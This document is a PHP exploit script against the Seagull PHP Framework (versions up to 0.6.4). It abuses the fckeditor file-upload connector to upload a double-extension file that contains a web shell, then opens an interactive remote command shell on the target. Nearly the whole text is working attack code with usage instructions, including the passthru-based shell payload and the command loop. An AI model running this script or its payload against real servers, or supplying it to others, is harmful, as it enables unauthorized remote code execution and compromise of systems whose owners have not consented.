&lt;?php

/*
	------------------------------------------------------------------------
	Seagull PHP Framework &lt;= 0.6.4 (fckeditor) Arbitrary File Upload Exploit
	------------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://seagullproject.org/
	details..: works only with a specific server configuration (e.g. an Apache server with the mod_mime module installed)

	[-] vulnerable code in /www/tinyfck/filemanager/connectors/php/config.php
	
	33.	// SECURITY: You must explicitelly enable this &quot;connector&quot;. (Set it to &quot;true&quot;).
	34.	$Config[&#039;Enabled&#039;] = true ;
	35.	
	36.	// Path to user files relative to the document root.
	37.	$Config[&#039;UserFilesPath&#039;] = SGL_BASE_URL . &#039;/images/&#039; ;
	38.	
	39.	// Fill the following value it you prefer to specify the absolute path for the
	40.	// user files directory. Usefull if you are using a virtual directory, symbolic
	41.	// link or alias. Examples: &#039;C:\\MySite\\UserFiles\\&#039; or &#039;/root/mysite/UserFiles/&#039;.
	42.	// Attention: The above &#039;UserFilesPath&#039; must point to the same directory.
	43.	$Config[&#039;UserFilesAbsolutePath&#039;] = SGL_WEB_ROOT.&#039;/images/&#039;;
	44.	
	45.	$Config[&#039;AllowedExtensions&#039;][&#039;File&#039;]    = array() ;
	46.	$Config[&#039;DeniedExtensions&#039;][&#039;File&#039;]     = array(&#039;php&#039;,&#039;php3&#039;,&#039;php5&#039;,&#039;phtml&#039;,&#039;asp&#039;,&#039;aspx&#039;,&#039;ascx&#039;,&#039;jsp&#039;,&#039;cfm&#039;, [...]
	47.	
	48.	$Config[&#039;AllowedExtensions&#039;][&#039;Image&#039;]   = array(&#039;jpg&#039;,&#039;gif&#039;,&#039;jpeg&#039;,&#039;png&#039;) ;
	49.	$Config[&#039;DeniedExtensions&#039;][&#039;Image&#039;]    = array() ;
	50.	
	51.	$Config[&#039;AllowedExtensions&#039;][&#039;Flash&#039;]   = array(&#039;swf&#039;,&#039;fla&#039;) ;
	52.	$Config[&#039;DeniedExtensions&#039;][&#039;Flash&#039;]    = array() ;
	53.	
	54.	$Config[&#039;AllowedExtensions&#039;][&#039;Media&#039;]   = array(&#039;swf&#039;,&#039;fla&#039;,&#039;jpg&#039;,&#039;gif&#039;,&#039;jpeg&#039;,&#039;png&#039;,&#039;avi&#039;,&#039;mpg&#039;,&#039;mpeg&#039;) ;
	55.	$Config[&#039;DeniedExtensions&#039;][&#039;Media&#039;]    = array() ;
	
	with a default configuration of this script, an attacker might be able to upload arbitrary
	files containing malicious PHP code due to multiple file extensions isn&#039;t properly checked
*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print &quot;\n+--------------------------------------------------------------------+&quot;;
print &quot;\n| Seagull &lt;= 0.6.4 (fckeditor) Arbitrary File Upload Exploit by EgiX |&quot;;
print &quot;\n+--------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......: php $argv[0] host path\n&quot;;
	print &quot;\nExample....: php $argv[0] localhost /&quot;;
	print &quot;\nExample....: php $argv[0] localhost /seagull/\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];

$filename  = md5(time()).&quot;.php.php4&quot;;
$connector = &quot;tinyfck/filemanager/connectors/php/connector.php&quot;;

$payload  = &quot;--o0oOo0o\r\n&quot;;
$payload .= &quot;Content-Disposition: form-data; name=\&quot;NewFile\&quot;; filename=\&quot;{$filename}\&quot;\r\n\r\n&quot;;
$payload .= &quot;&lt;?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?&gt;\r\n&quot;;
$payload .= &quot;--o0oOo0o--\r\n&quot;;

$packet  = &quot;POST {$path}{$connector}?Command=FileUpload&amp;Type=File&amp;CurrentFolder=%2f HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
$packet .= &quot;Content-Type: multipart/form-data; boundary=o0oOo0o\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;
$packet .= $payload;

preg_match(&quot;/OnUploadCompleted\((.*),\&quot;(.*)\&quot;\)/i&quot;, http_send($host, $packet), $html);
if (!in_array(intval($html[1]), array(0, 201))) die(&quot;\n[-] Upload failed! (Error {$html[1]})\n&quot;);

while(1)
{
	print &quot;\nseagull-shell# &quot;;
	$cmd = trim(fgets(STDIN));
	if ($cmd != &quot;exit&quot;)
	{
		$packet = &quot;GET {$path}images/File/{$html[2]} HTTP/1.0\r\n&quot;;
		$packet.= &quot;Host: {$host}\r\n&quot;;
		$packet.= &quot;Cmd: &quot;.base64_encode($cmd).&quot;\r\n&quot;;
		$packet.= &quot;Connection: close\r\n\r\n&quot;;
		$output = http_send($host, $packet);
		if (!preg_match(&quot;/_code_/&quot;, $output)) die(&quot;\n[-] Exploit failed...\n&quot;);
		$shell  = explode(&quot;_code_&quot;, $output);
		print &quot;\n{$shell[1]}&quot;;
	}
	else break;
}

?&gt;
